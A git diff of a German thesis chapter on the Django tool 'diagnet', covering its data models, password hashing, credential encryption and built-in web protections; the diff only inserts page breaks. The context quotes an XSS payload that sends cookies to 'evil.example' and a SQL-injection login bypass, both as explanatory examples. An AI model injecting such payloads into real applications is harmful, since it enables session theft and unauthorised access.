@@ -21,6 +21,8 @@ Bevor die konkrete Implementierung der Django-Modelle in Angriff genommen wurde,
 
 Das resultierende Datenmodell gliedert sich in vier Bereiche. Die *Geräteverwaltung* bildet physische und virtuelle Netzwerkgeräte samt ihren Verbindungsparametern ab. Die *Testfall-Domäne* beschreibt die abstrakten Testvorlagen inklusive des Python-Modulnamens für den dynamischen Classloader. Die *Parametrisierung* bildet die zur Laufzeit übergebenen Argumente in einer rekursiven Baumstruktur ab, da Netzwerktests sehr unterschiedliche Eingaben erfordern können. Abgeschlossene Testläufe werden schließlich in der *Ergebnisdomäne* unveränderlich gespeichert, damit jeder Zustandswechsel der Infrastruktur nachvollziehbar bleibt.
 
+#pagebreak()
+
 === Das Device-Modell: Integrität auf Feldebene
 
 Das Modell `Device` ist das Fundament der Anwendung, da nahezu jede andere Entität eine Beziehung zu einem Gerät aufweist. Aus diesem Grund wurden die Validierungsregeln direkt auf Datenbankebene an dieses Modell gebunden, um fehlerhafte Eingaben so früh wie möglich im Datenfluss abzufangen.
@@ -28,6 +30,8 @@ Das Modell `Device` ist das Fundament der Anwendung, da nahezu jede andere Entit
 Für das Feld `ip_address` kommt Djangos natives `GenericIPAddressField` zum Einsatz. Dieser Feldtyp erzwingt auf Datenbankebene, dass ausschließlich syntaktisch korrekte IPv4- oder IPv6-Adressen persistiert werden können. Der Port wird als `IntegerField` mit den Validatoren `MinValueValidator(1)` und `MaxValueValidator(65535)` abgesichert, was dem durch #htl3r.full[tcp]/#htl3r.short[udp] definierten gültigen Portbereich entspricht. Für das Verbindungsprotokoll wurde ein `CharField` mit einer `choices`-Enumeration gewählt, sodass ausschließlich die definierten Werte `ssh` und `telnet` akzeptiert werden. Das Feld `device_type` unterscheidet zwischen sechs Geräteklassen, die jeweils Router- und Switch-Varianten der Betriebssysteme IOS, IOSXE und IOSXR abdecken.
 
 Die kritischste Integritätsregel wird jedoch durch einen `CheckConstraint` in der inneren `Meta`-Klasse des Modells durchgesetzt. Da das unverschlüsselte #htl3r.long[telnet]-Protokoll ein inakzeptables Sicherheitsrisiko darstellt, wird dessen Verwendung in Kombination mit IOSXE-Geräten auf Datenbankebene hart unterbunden. Der Constraint greift dabei auf einen Suffix-Vergleich zurück (`device_type__endswith="iosxe"`), da sowohl Router als auch Switches unter IOSXE fallen:
+
+#pagebreak()
 
 #htl3r.code(
   caption: [Protokoll-Constraint zur Verhinderung von Telnet auf IOSXE-Geräten],
@@ -68,6 +72,8 @@ Die kritischste Integritätsregel wird jedoch durch einen `CheckConstraint` in d
   ```
 ]
 
+#pagebreak()
+
 Dieser Ansatz ist der alternativen Implementierung einer Validierung in der View oder im Formular vorzuziehen. Ein Constraint auf Datenbankebene greift unabhängig davon, über welchen Pfad Daten eingespielt werden, ob über die Web-Oberfläche, die #htl3r.short[api] oder direkt per Datenbankzugriff.
 
 === Das TestCase-Modell: Dynamisches Laden via Reflection
@@ -79,6 +85,8 @@ Die Zuordnung eines Testfalls zu den Geräten, auf denen er ausgeführt werden s
 === Parametrisierung: Rekursive Baumstruktur
 
 Eine besondere Herausforderung bei der Datenmodellierung stellte die Abbildung der Testparameter dar. Netzwerktests sind in ihrer Parametrisierung sehr heterogen: Ein einfacher Ping-Test benötigt lediglich eine Zieladresse, während ein Routing-Test eine vollständige Liste von Präfixen, zugehörigen Next-Hops und weiteren Metadaten erwartet.
+
+#pagebreak()
 
 Um diese beliebig tief verschachtelten Strukturen in einem flachen relationalen Datenbankschema abzubilden, wurde das Modell `TestParameter` mit einer reflexiven Many-to-One-Beziehung versehen. Ein `TestParameter`-Datensatz kann über das Feld `parent_test_parameter` auf einen anderen `TestParameter` desselben Typs verweisen, womit er in der Hierarchie eine Kindposition einnimmt. Diese Technik, bekannt als *Adjacency List*, ist ein etabliertes Entwurfsmuster für die Speicherung von Baumstrukturen in relationalen Datenbanken. Sowohl `name` als auch `value` sind als `TextField` ohne Längenbegrenzung deklariert, da die maximale Länge eines Parameterwerts nicht vorhersehbar ist:
 
@@ -130,6 +138,8 @@ In der relationalen Datenbank wird diese Beziehung durch eine automatisch von Dj
 
 Nach Abschluss eines Testlaufs speichert #htl3r.long[diagnet] das vollständige Ergebnis im Modell `TestResult`. Das Modell hält dabei zwei getrennte Zeitstempelfelder: `started_at` und `finished_at`, womit die Laufzeit eines Tests präzise nachvollziehbar bleibt. Das boolesche Feld `result` speichert, ob der Test bestanden wurde. Die eigentlichen Rohlogs und der strukturierte Statusbericht der Test-Engine werden im separaten `JSONField` `log` abgelegt, das direkt über Python-Dictionary-Syntax abfragbar ist, ohne vorher als Rohtext geparst werden zu müssen.
 
+#pagebreak()
+
 Die `save()`-Überschreibung folgt dem Prinzip des *Fat Model, Thin View*: Logik, die unabhängig vom Aufrufpfad korrekt laufen muss, gehört ins Modell und nicht in die View. Beim erstmaligen Speichern eines neuen `TestResult`-Datensatzes ermittelt die Methode den höchsten bereits vergebenen `attempt_id`-Wert für den entsprechenden `TestCase` und setzt den neuen Wert auf das nächste Inkrement:
 
 #htl3r.code(
@@ -170,6 +180,8 @@ Jede Änderung an einem Django-Modell, sei es das Hinzufügen eines Feldes, die 
 
 Für den Produktionseinsatz von #htl3r.long[diagnet] hat dieses Vorgehen einen entscheidenden Vorteil: Das Datenbankschema kann von einem leeren Zustand aus durch den Befehl `python manage.py migrate` vollständig aufgebaut werden, ohne dass manuelle #htl3r.short[sql]-Skripte notwendig wären. Die Migrationsdateien selbst werden im Git-Repository versioniert und bieten damit eine nachvollziehbare Historie aller Schemaänderungen über die gesamte Projektlaufzeit.
 
+#pagebreak()
+
 == Datensicherheit <data_security>
 
 Zugangsdaten für Netzwerkgeräte zählen zu den sensibelsten Informationen einer IT-Infrastruktur. Dieses Kapitel beschreibt die Maßnahmen, die in #htl3r.long[diagnet] ergriffen wurden, um diese Daten sowohl im gespeicherten Zustand als auch während der Benutzerinteraktion zu schützen.
@@ -195,6 +207,8 @@ Der zweite Eintrag dient der Rückwärtskompatibilität: Existierende Passwörte
 ==== Funktionsprinzip von Argon2
 
 Argon2 ist eine *Key Derivation Function* und gewann 2015 den Password Hashing Competition, der explizit nach einem Nachfolger für ältere Verfahren wie bcrypt und PBKDF2 suchte @rfc9106. Der entscheidende Unterschied zu diesen Vorgängern liegt darin, dass Argon2 nicht nur rechenintensiv, sondern auch gezielt *speicherintensiv* ist. Die Speicheranforderung lässt sich über den Parameter `memory_cost` in Kilobyte konfigurieren und ist fester Bestandteil der Algorithmusdefinition, nicht nachträgliche Optimierung.
+
+#pagebreak()
 
 Argon2 existiert in drei Varianten: Argon2d ist optimiert gegen GPU-Angriffe, Argon2i gegen Seitenkanalangriffe, und Argon2id kombiniert beide Ansätze. Djangos Implementierung verwendet standardmäßig Argon2id, was für allgemeine Passwort-Hashing-Zwecke die empfohlene Wahl ist.
 
@@ -235,6 +249,8 @@ Der Chiffretext wird mit *AES-128-CBC* erzeugt. Der 256-Bit-Fernet-Schlüssel wi
 ==== HMAC als Integritätssicherung
 
 Der #htl3r.short[hmac] am Ende des Tokens ist der entscheidende Unterschied zwischen reiner Verschlüsselung und *authentifizierter* Verschlüsselung @rfc2104. AES-CBC allein würde nur Vertraulichkeit bieten, aber keine Integrität: Ein Angreifer könnte Bits im Chiffretext verändern, und das System würde beim Entschlüsseln fehlerhafte Daten produzieren, ohne dies zu erkennen. Fernet löst dieses Problem durch #htl3r.short[hmac]-SHA256: Bevor entschlüsselt wird, verifiziert die Bibliothek den MAC kryptografisch gegen den gespeicherten Schlüssel. Schlägt diese Verifikation fehl, wird eine `InvalidToken`-Exception geworfen; die Entschlüsselung beginnt gar nicht erst.
+
+#pagebreak()
 
 In der `_decrypt_value`-Methode des `Device`-Modells wird genau dieses Verhalten genutzt:
 
@@ -301,6 +317,8 @@ Für diesen Fall implementiert #htl3r.long[diagnet] den Management-Befehl `rotat
   ```
 ]
 
+#pagebreak()
+
 === Web-Sicherheit: Djangos eingebaute Schutzmechanismen <web_security>
 
 Neben der Absicherung gespeicherter Daten muss eine Webanwendung auch gegen aktive Angriffe auf die Benutzerinteraktion gewappnet sein. Django adressiert die gängigsten Angriffsvektoren durch Mechanismen, die standardmäßig aktiv sind und in `settings.py` über die `MIDDLEWARE`-Liste eingebunden werden @django-security. Für #htl3r.long[diagnet] relevant sind vor allem drei davon.
@@ -313,6 +331,8 @@ Django begegnet diesem Angriff mit dem `CsrfViewMiddleware`-Token-Verfahren. Bei
 
 In den Templates von #htl3r.long[diagnet] ist `{% csrf_token %}` in jedem Formular eingebunden, beginnend beim Login-Formular bis hin zu allen zustandsverändernden Operationen wie dem Anlegen oder Löschen von Geräten.
 
+#pagebreak()
+
 ==== Cross-Site Scripting
 
 #htl3r.full[xss]-Angriffe zielen darauf ab, schadhaften JavaScript-Code in die Ausgabe einer Webanwendung einzuschleusen, der dann im Browser anderer Benutzer ausgeführt wird. Im einfachsten Fall könnte ein Angreifer einen Hostnamen wie `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in das Namensfeld eines Geräts eintragen. Würde dieser Wert ungefiltert in eine HTML-Seite eingebettet, könnten die Session-Cookies aller Benutzer, die diese Seite aufrufen, an einen Angreifer übermittelt werden.
@@ -324,6 +344,8 @@ Django verhindert dies durch automatisches HTML-Escaping in seiner Template-Engi
 Bei einer #htl3r.short[sql]-Injection-Attacke werden benutzerkontrollierte Eingaben ungefiltert in #htl3r.short[sql]-Abfragen eingebettet, was einem Angreifer ermöglicht, die Abfragelogik zu verändern. Der klassische Angriff `' OR '1'='1` in einem Login-Formular würde eine naiv implementierte Authentifizierungsabfrage aushebeln und Zugriff ohne gültige Credentials gewähren.
 
 Da #htl3r.long[diagnet] ausschließlich Djangos #htl3r.short[orm] für Datenbankoperationen einsetzt und an keiner Stelle rohe #htl3r.short[sql]-Strings mit Benutzerinhalten konkateniert werden, ist dieser Angriffsvektor ausgeschlossen. Das #htl3r.short[orm] verwendet intern *Prepared Statements* mit parametrisierten Queries, bei denen die Datenbank Abfragestruktur und Benutzerdaten als vollständig getrennte Elemente erhält. Die Datenbank-Engine interpretiert Benutzereingaben damit nicht als #htl3r.short[sql]-Code, unabhängig von deren Inhalt.
+
+#pagebreak()
 
 ==== Clickjacking und HTTP-Sicherheitsheader
 
